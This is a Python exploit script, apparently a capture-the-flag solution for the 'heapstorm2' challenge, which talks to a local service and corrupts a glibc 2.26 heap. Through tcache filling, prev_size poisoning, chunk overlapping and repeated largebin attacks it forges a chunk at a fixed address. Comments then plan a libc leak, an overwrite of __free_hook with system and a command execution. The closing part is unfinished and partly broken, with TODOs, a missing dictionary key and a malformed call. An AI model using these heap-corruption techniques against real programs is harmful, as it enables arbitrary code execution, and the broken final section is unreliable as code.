import socket
import sys
from time import sleep
from struct import pack, unpack

from utils import _is_int, to_bytes, from_bytes
from roputils import *
from logger import Logger

logger = Logger("HEAPSTORM II")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

'''                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
def get_libc_path():
    with open("libcpath", "r") as f:
        return f.read()[:-1]
'''

# at update: send only the bytes needed, without \n
# elsewhere: can terminate with \n, will be replaced by \x00

# NOTE: this attack is for the binary linked with glibc 2.26 not 2.24, 
#       so the tcache must be filled at some points

DELAY = 0.05

ALLOC = b'1\n'
UPDATE = b'2\n'
FREE = b'3\n'
SHOW = b'4\n'
EXIT = b'5\n'

def allocate_request(size):

    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{size}\n".encode())

    sleep(DELAY)
    recvd = sock.recv(1024)
    
    recvd = recvd.split(b"Chunk")[1].split(b"Alloc")[0]
    recvd = _is_int(recvd[:-1])

    return recvd

def update_request(idx, content):

    if type(content) is str:
        content = content.encode()
    
    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}\n".encode())

    sleep(DELAY)
    
    sock.recv(1024)
    sock.send(f"{len(content)}\n".encode())

    sleep(DELAY)
    
    sock.recv(1024)
    sock.send(content)

    sleep(DELAY)
    sock.recv(1024)

    return None

def free_request(idx):
    
    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}\n".encode())

    sleep(DELAY)
    sock.recv(1024)

    return None

def show_request(idx):
    
    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}\n".encode())

    sleep(DELAY)
    recvd = sock.recv(1024)

    logger.log_info(f"raw recvd: {recvd}")

    recvd = recvd.split(b"]: ")[1]
    recvd = recvd[:-1]

    return recvd

def command(opt):

    sock.send(opt[0])

    if opt[0] is ALLOC:
        res = allocate_request(*opt[1:])
        logger.log_info(f"allocating chunk with size {hex(opt[1])}: idx {res}")
        return res

    elif opt[0] is UPDATE:
        logger.log_info(f"updating chunk with index {opt[1]}")
        return update_request(*opt[1:])

    elif opt[0] is FREE:
        logger.log_info(f"free chunk with index {opt[1]}")
        return free_request(*opt[1:])

    elif opt[0] is SHOW:
        logger.log_info(f"showing chunk with index {opt[1]}")
        return show_request(*opt[1:])

    elif opt[0] is EXIT:
        logger.log_info(f"sending exit command")
        return None

def command_stream():

    # canary, PIE, ASLR, relro full

    MMAP_ADDR = 0x13370000
    LAST_BYTES = 0x49495f4d524f5453    # b'STORM_II'

    sock.recv(1024)

    ch = {}

    # ===== obtaining arbitrary chunk ======

    # filling tcache for 0x30
    '''for _ in range(7):
        ch['tcache_0x30'] = command((ALLOC, 0x30 - 0x10))
        command((FREE, ch['tcache_0x30']))'''

    # filling tcache for 0x100
    for _ in range(7):
        ch['tcache_0x100'] = command((ALLOC, 0x100 - 0x10))
        command((FREE, ch['tcache_0x100']))

    # filling tcache for 0x150
    for _ in range(7):
        ch['tcache_0x150'] = command((ALLOC, 0x150 - 0x10))
        command((FREE, ch['tcache_0x150']))

    # some grooming 
    # need to have at most 16 chunks allocated at a time
    # so the chosen sizes might seem "weird"

    ch['p'] = command((ALLOC, 0x1000 - 0x10))           # start of overlapped region
    ch['overlap_c0'] = command((ALLOC, 0x900 - 0x10))
    ch['filler0'] = command((ALLOC, 0x1000 - 0x10))
    ch['overlap_c1'] = command((ALLOC, 0x1000 - 0x10)) 
    ch['a'] = command((ALLOC, 0x1000 + 0x8 - 0x10))
    ch['b'] = command((ALLOC, 0x100 - 0x10))

    # poison b: prev size = 0x4900, prev inuse = 0
    
    for i in range(7):
        command((UPDATE, ch['a'], b'A' * (0xff8 - 0xc - i)))

    #input()
    command((UPDATE, ch['a'], b'A' * (0xff8 - 0xc - 0x8)))

    # free p and then free b
    # tcache for b(0x100) is filled

    command((FREE, ch['p']))    
    command((FREE, ch['b']))    # trigger merging with p 
                                # and overlapping everything in between

    # taking from the top that is overlapping most of previous chunks

    ch['g0'] = command((ALLOC, 0xff0 - 0x10))
    ch['c0'] = command((ALLOC, 0x910 - 0x10))

    ch['g1'] = command((ALLOC, 0xff0 - 0x10))
    ch['c1'] = command((ALLOC, 0x900 - 0x10))

    ch['pad'] = command((ALLOC, 0x100 - 0x10))

    # largebin attack: forging TARGET->fd = c1

    TARGET_ADDR = MMAP_ADDR + 0x800 - 0x10

    command((FREE, ch['c0']))
    ch['g2'] = command((ALLOC, 0x1000 - 0x10))
    command((UPDATE, ch['overlap_c0'], b'\x00' * 8 + to_bytes(TARGET_ADDR - 0x20)))

    command((FREE, ch['c1']))
    ch['g3'] = command((ALLOC, 0x1000 - 0x10))

    # lil' cleaning

    command((FREE, ch['g3'])) # merged with top
    command((FREE, ch['g2'])) # merged with top

    # 7 chunks allocated till now
    
    # extracting back c1
    command((UPDATE, ch['overlap_c1'], b'\x00' * 0x10))
    ch['c1'] = command((ALLOC, 0x900 - 0x10))
    
    # extraction of c0 can only be done by splitting and then re-merging
    command((UPDATE, ch['overlap_c0'], b'\x00' * 0x10))
    ch['c0_fst'] = command((ALLOC, 0x100 - 0x10))           # will split the c0 from largebin
    command((FREE, ch['c0_fst']))                           # merging with the rest of c0 from unsorted bin

    # corresponding largebin should be clear now
    
    # now c0 is in unsorted bin and can be (re-)allocated safely
    ch['c0'] = command((ALLOC, 0x910 - 0x10))

    command((FREE, ch['pad']))
    command((FREE, ch['c1']))

    ch['c1'] = command((ALLOC, 0x920 - 0x10))
    ch['pad'] = command((ALLOC, 0x100 - 0x10))

    # (repeating) largebin attack: forging TARGET->bk = c0

    command((FREE, ch['c1']))
    ch['g2'] = command((ALLOC, 0x1000 - 0x10))
    command((UPDATE, ch['overlap_c1'], b'\x00' * 8 + to_bytes(TARGET_ADDR - 0x20 + 0x8)))

    command((FREE, ch['c0']))
    ch['g3'] = command((ALLOC, 0x1000 - 0x10))

    # clearing again

    command((FREE, ch['g3'])) # merged with top
    command((FREE, ch['g2'])) # merged with top

    # 7 chunks allocated

    # extracting back c0
    command((UPDATE, ch['overlap_c0'], b'\x00' * 0x10))
    ch['c0'] = command((ALLOC, 0x910 - 0x10))
    
    command((UPDATE, ch['overlap_c1'], b'\x00' * 0x10))
    ch['c1_fst'] = command((ALLOC, 0x100 - 0x10))           
    command((FREE, ch['c1_fst']))                         

    # corresponding largebin should be clear now
    
    # now c1 is in unsorted bin and can be (re-)allocated safely
    ch['c1'] = command((ALLOC, 0x920 - 0x10))

    # (repeating) largebin attack: forging TARGET->size > 0 (to prevent calloc crash)
    # NOTE: size will depend of address randomization (most commonly, 0x55, 0x56)
    # the forged size must have the mmap flag on, otherwise calloc will crash

    command((FREE, ch['c1']))
    ch['g2'] = command((ALLOC, 0x1000 - 0x10))
    command((UPDATE, ch['overlap_c1'], b'\x00' * 8 + to_bytes(TARGET_ADDR - 0x28 - 0x5)))

    command((FREE, ch['c0']))
    ch['g3'] = command((ALLOC, 0x1000 - 0x10))

    # clearing again

    command((FREE, ch['g3']))
    command((FREE, ch['g2'])) 

    command((UPDATE, ch['overlap_c0'], b'\x00' * 0x10))
    ch['c0'] = command((ALLOC, 0x910 - 0x10))

    command((UPDATE, ch['overlap_c1'], b'\x00' * 0x10))
    ch['c1_fst'] = command((ALLOC, 0x100 - 0x10))           
    command((FREE, ch['c1_fst']))                           

    # corresponding largebin should be clear now
    
    # now c1 is in unsorted bin and can be (re-)allocated safely
    ch['c1'] = command((ALLOC, 0x920 - 0x10))

    # all merged with top
    command((FREE, ch['pad']))
    command((FREE, ch['c1']))
    command((FREE, ch['g1']))
    command((FREE, ch['c0']))
    command((FREE, ch['g0']))

    # 4 chunks occupied

    # overlapping again (the same region), with a new set of pointers

    ch['p_2'] = command((ALLOC, 0xff0 - 0x10))         
    ch['overlap_c0_2'] = command((ALLOC, 0x900 - 0x10))
    ch['filler0_2'] = command((ALLOC, 0x1000 - 0x10))
    ch['overlap_c1_2'] = command((ALLOC, 0x1000 - 0x10)) 
    ch['filler1_2'] = command((ALLOC, 0x800 - 0x10))
    ch['a_2'] = command((ALLOC, 0x810 + 0x8 - 0x10))
    ch['b_2'] = command((ALLOC, 0x100 - 0x10))
    
    for i in range(7):
        command((UPDATE, ch['a_2'], b'A' * (0x808 - 0xc - i)))

    command((UPDATE, ch['a_2'], b'A' * (0x808 - 0xc - 0x8)))

    command((FREE, ch['p_2']))    
    command((FREE, ch['b_2']))  

    # 9 chunks occupied

    ch['g0_2'] = command((ALLOC, 0xff0 - 0x10))
    ch['c0_2'] = command((ALLOC, 0x150 - 0x10))
    ch['d0_2'] = command((ALLOC, 0x7c0 - 0x10))
    ch['g1_2'] = command((ALLOC, 0xff0 - 0x10))
    ch['c1_2'] = command((ALLOC, 0x150 - 0x10))
    ch['pad_2'] = command((ALLOC, 0x100 - 0x10))  

    # 15 chunks

    # forging fake small sized chunk at TARGET

    command((FREE, ch['c1_2']))
    command((FREE, ch['c0_2']))

    ch['g2_2'] = command((ALLOC, 0x1000))
    command((FREE, ch['g2_2']))

    command((UPDATE, ch['overlap_c0_2'], to_bytes(TARGET_ADDR - 0x10) + b'\x00' * 8))
    command((UPDATE, ch['overlap_c1_2'], b'\x00' * 8 + to_bytes(TARGET_ADDR - 0x10)))

    ch['c1_2'] = command((ALLOC, 0x150 - 0x10))
    ch['target'] = command((ALLOC, 0x150 - 0x10))

    input()

    # ===== launch shell =====

    # first, bypass xor protection
    command((UPDATE, b'\x00' * 0x20 + 
                        to_bytes(0x13377331) +
                        b'\x00' * 0x8 + 
                        b'\x00' * 0x100))

    # TODO
    # NOTE: for various reasons, my ASLR decided that the heap addresses will only start with 0x55
    #       so I could not execute the rest of the attack
    # first, do some alloc-freeing and showing to leak heap and libc base
    # then, unsafe unlink a chunk:
    # allocate (again) chunks, fake prev inuse and prev size 0x4900
    # but this time the "prev" chunk contains pointers inside mmapped region
    # and after unlinker, obtain arbitrary write with the pointer of that chunk
    # then, overwrite __free_hook with system address
    # and then "free" a chunk that contains payload

    ch['aux'] = command((ALLOC, 0x1000 - 0x10))
    ch['aux2'] = command((ALLOC, 0x1000 - 0x10))
    ch['prev'] = command((ALLOC, 0x1000 - 0x10))
    ch['p0'] = command((ALLOC, 0x1000 - 0x10))
    ch['p0'] = command((ALLOC, 0x1000 - 0x10))
    ch['p0'] = command((ALLOC, 0x1000 - 0x10))
    command((UPDATE, ch['payload'], "touch HACKED"))
                                
    input()

    # TODO

if __name__ == "__main__":

    ok = False
    while ok is False:

        try:
            command_stream()
            ok = True
        except Exception:

            logger.log_warning("Size for fake chunk is inadequate; retrying...")

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(SERVER_ADDR)
